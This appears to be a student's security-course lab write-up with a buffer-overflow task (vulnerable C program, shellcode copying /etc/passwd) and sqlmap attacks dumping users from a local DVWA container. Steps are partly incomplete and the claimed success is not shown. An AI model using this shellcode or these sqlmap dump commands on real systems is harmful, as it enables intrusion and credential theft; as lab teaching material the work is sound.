# Lab #1,22110009, Le Cong Bao, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
  #### step 1: Create a vulnerable c program
  ``` 
    seed@567028f4b4b0:~/seclabs/bof$ nano vulnerable.c 
  ```
  ![image](https://github.com/user-attachments/assets/227b7284-5d61-466c-a766-f56c8ba2579b)

  #### step 2: Compile the vulnerable c program
  ```bash
     gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack
  ```
  
  - -fno-stack-protector: Disables stack protection, making the program vulnerable to buffer overflow attacks.
  - -z execstack: Allows execution of code on the stack, enabling exploitation through injected shellcode.
  #### step 3: Build an Assemply payload
  ``` 
    seed@567028f4b4b0:~/seclabs/bof$ nano shellcode.asm
  ```
  ![image](https://github.com/user-attachments/assets/4f8b0e7d-a38a-4098-bab7-025926764e0b)

  #### step 4: Compile the Asssemply code
  ```bash
     nasm -f elf32 -o shellcode.o shellcode.asm
     ld -m elf_i386 -o shellcode shellcode.o
  ```
  #### step 5: Find the address of the shellcode
  ```bash
     gdb ./redundant_code
  ```
  - in `gdb` set a breakpoint at `main ` run the program with a dummy argument to obtain the address of your shellcode.
  ```bash
     break main
     run $(python -c "print('A'*72)")
     p &buffer
  ```
    
**Conclusion**: The execution of the vulnerable program with the crafted input successfully copies the `/etc/passwd` file to `/tmp/pwfile`. The shellcode executed as intended, demonstrating the buffer overflow attack effectively.

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
1. Pull DVWA Docker image
   ```bash
      docker pull vulnerables/web-dvwa
      docker run -d -p 80:80 vulnerables/web-dvwa
   ```
   ![image](https://github.com/user-attachments/assets/c89ed07c-5616-4614-8b55-8f4a27d30e8a)
2. Access DVWA with a web browser and go to: http://localhost Log in with the default user
   ![image](https://github.com/user-attachments/assets/c4c3bba3-24e9-4a2b-a9c3-660a20aeed61)

    User: admin
   Password: password

    ![2](https://github.com/user-attachments/assets/d606eac2-2999-4370-b19c-b959cda33fff)
4. Install SQLMap in WSL
   ```bash
      wsl
      sudo apt install sqlmap
   ```
5. Find the website url to attack
   ![image](https://github.com/user-attachments/assets/aaad26f0-4f4e-49f8-8910-bc69b19387f2)
   enter random to return http://localhost/vulnerabilities/sqli/?id=1
6. Get information from the database
   ```bash
      sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --dbs
   ```
   ![image](https://github.com/user-attachments/assets/71f7e9eb-e266-44a5-841d-d9e0d713a32f)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
- Choose DVWA database and use sqlmap to get table
```bash
   sqlmap -u "http://localhost/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
```
![image](https://github.com/user-attachments/assets/c614bd0a-1abb-48a3-af4e-a7dc054233a8)

- Choice Database is Users and use sqlmap to get users information
  ```bash
     sqlmap -u "http://localhost/vulnerabilities/sqli" --cookie="ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
  ```
  ![image](https://github.com/user-attachments/assets/530a460d-f677-4106-9d1c-dd01b55b6b92)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
